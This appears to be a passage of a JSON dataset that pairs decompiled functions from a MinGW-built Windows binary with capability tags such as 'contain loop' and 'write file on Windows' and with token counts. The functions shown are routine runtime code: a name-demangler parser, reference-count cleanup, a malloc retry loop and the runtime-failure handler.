        "decompiled_code": "\nint32_t * __fastcall fcn.0040e790(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x110) == 0) {\n        *(in_EAX + 0x118) = 1;\n        return NULL;\n    }\n    iVar2 = *param_2;\n    piVar1 = *(*(*(in_EAX + 0x110) + 4) + 0xc);\n    if (iVar2 < 0) {\n        return piVar1;\n    }\n    if ((piVar1 == NULL) || (*piVar1 != 0x2f)) {\n        return NULL;\n    }\n    if (iVar2 < 1) {\n        if (iVar2 != 0) {\n            return NULL;\n        }\n    }\n    else {\n        do {\n            piVar1 = piVar1[3];\n            iVar2 = iVar2 + -1;\n            if (piVar1 == NULL) {\n                return piVar1;\n            }\n            if (*piVar1 != 0x2f) {\n                return NULL;\n            }\n        } while (iVar2 != 0);\n    }\n    return piVar1[2];\n}\n",
        "token_count": 285
    },
    "0040f2b0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0040f2b0(void)\n\n{\n    uint uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_EAX;\n    char *pcVar5;\n    int32_t *piVar6;\n    int32_t aiStack32 [4];\n    \n    if (1 < **(in_EAX + 0xc) + 0xb7U) {\n        return 0;\n    }\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    pcVar5 = *(in_EAX + 0xc);\n    uVar4 = *(in_EAX + 0x28);\n    cVar2 = *pcVar5;\n    if (cVar2 == 'E') {\n        *(in_EAX + 0xc) = pcVar5 + 1;\n        uVar4 = fcn.0040df00(0);\n        return uVar4;\n    }\n    aiStack32[0] = 0;\n    piVar6 = aiStack32;\n    do {\n        if (cVar2 == 'L') {\n            iVar3 = fcn.0040e8f0();\n        }\n        else if (cVar2 < 'M') {\n            if (1 < cVar2 + 0xb7U) goto code_r0x0040f250;\n            iVar3 = fcn.0040f2b0();\n        }\n        else if (cVar2 == 'X') {\n            uVar1 = *(in_EAX + 0x30);\n            *(in_EAX + 0x30) = 1;\n            *(in_EAX + 0xc) = pcVar5 + 1;\n            iVar3 = fcn.0040ea70();\n            *(in_EAX + 0x30) = uVar1;\n            if (**(in_EAX + 0xc) != 'E') {\n                return 0;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n        }\n        else {\ncode_r0x0040f250:\n            iVar3 = fcn.0040f7c0();\n        }\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.0040df00(0);\n        *piVar6 = iVar3;\n        if (iVar3 == 0) {\n            return 0;\n        }\n        pcVar5 = *(in_EAX + 0xc);\n        piVar6 = iVar3 + 0xc;\n        cVar2 = *pcVar5;\n        if (cVar2 == 'E') {\n            *(in_EAX + 0x28) = uVar4;\n            *(in_EAX + 0xc) = pcVar5 + 1;\n            return aiStack32[0];\n        }\n    } while( true );\n}\n",
        "token_count": 645
    },
    "0048f130": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048f130(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    iVar3 = *(param_1 + 4);\n    if (iVar3 != 0) {\n        if (*(param_1 + 8) != 0) {\n            uVar4 = 0;\n            do {\n                piVar2 = *(iVar3 + uVar4 * 4);\n                if (piVar2 != NULL) {\n                    if (*0x4f59f4 == 0) {\n                        iVar3 = piVar2[1];\n                        piVar2[1] = iVar3 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar1 = piVar2 + 1;\n                        iVar3 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar3 == 1) {\n                        (**(*piVar2 + 4))();\n                    }\n                    iVar3 = *(param_1 + 4);\n                }\n                uVar4 = uVar4 + 1;\n            } while (uVar4 <= *(param_1 + 8) && *(param_1 + 8) != uVar4);\n            if (iVar3 == 0) goto code_r0x0048f190;\n        }\n        fcn.004a34b0(iVar3);\n    }\ncode_r0x0048f190:\n    iVar3 = *(param_1 + 0xc);\n    if (iVar3 != 0) {\n        if (*(param_1 + 8) != 0) {\n            uVar4 = 0;\n            do {\n                piVar2 = *(iVar3 + uVar4 * 4);\n                if (piVar2 != NULL) {\n                    if (*0x4f59f4 == 0) {\n                        iVar3 = piVar2[1];\n                        piVar2[1] = iVar3 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar1 = piVar2 + 1;\n                        iVar3 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar3 == 1) {\n                        (**(*piVar2 + 4))();\n                    }\n                    iVar3 = *(param_1 + 0xc);\n                }\n                uVar4 = uVar4 + 1;\n            } while (uVar4 <= *(param_1 + 8) && *(param_1 + 8) != uVar4);\n            if (iVar3 == 0) goto code_r0x0048f1de;\n        }\n        fcn.004a34b0(iVar3);\n    }\ncode_r0x0048f1de:\n    iVar3 = *(param_1 + 0x10);\n    if (iVar3 != 0) {\n        iVar5 = 0;\n        do {\n            if (*(iVar3 + iVar5) != 0) {\n                fcn.004a34b0(*(iVar3 + iVar5));\n                iVar3 = *(param_1 + 0x10);\n            }\n            iVar5 = iVar5 + 4;\n        } while (iVar5 != 0x18);\n        if (iVar3 != 0) {\n            fcn.004a34b0(iVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 761
    },
    "004a34e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004a34e0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    if (param_1 == 0) {\n        param_1 = 1;\n    }\n    while( true ) {\n        iVar1 = sub.msvcrt.dll_malloc(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        pcVar2 = fcn.0049df70();\n        if (pcVar2 == NULL) break;\n        (*pcVar2)();\n    }\n    puVar3 = fcn.004a3610(4);\n    *puVar3 = 0x50b59c;\n    iVar1 = 0x5076d4;\n    fcn.004a3bc0(puVar3, 0x5076d4, fcn.0049c330);\n    if (iVar1 == 0) {\n        iVar1 = 1;\n    }\n    while( true ) {\n        iVar4 = sub.msvcrt.dll_malloc(iVar1);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        pcVar2 = fcn.0049df70();\n        if (pcVar2 == NULL) break;\n        (*pcVar2)();\n    }\n    return 0;\n}\n",
        "token_count": 304
    },
    "004a6950": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.004a6950(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    \n    uVar4 = fcn.00427a10(2);\n    sub.msvcrt.dll_fwrite(\"Mingw-w64 runtime failure:\\n\", 1, 0x1b, uVar4);\n    uVar4 = fcn.00427a10(2);\n    sub.msvcrt.dll_vfprintf(uVar4, param_1, &stack0x00000008);\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar2 == 0) {\n        *0x4ae004 = 0x41ca80;\n        pcVar3 = 0x41c830;\n    }\n    else {\n        *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"__register_frame_info\");\n        *0x4ae004 = (*pcVar1)(iVar2, \"__deregister_frame_info\");\n    }\n    if (pcVar3 != NULL) {\n        (*pcVar3)(0x50c0f8, 0x54901c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 478
    }
}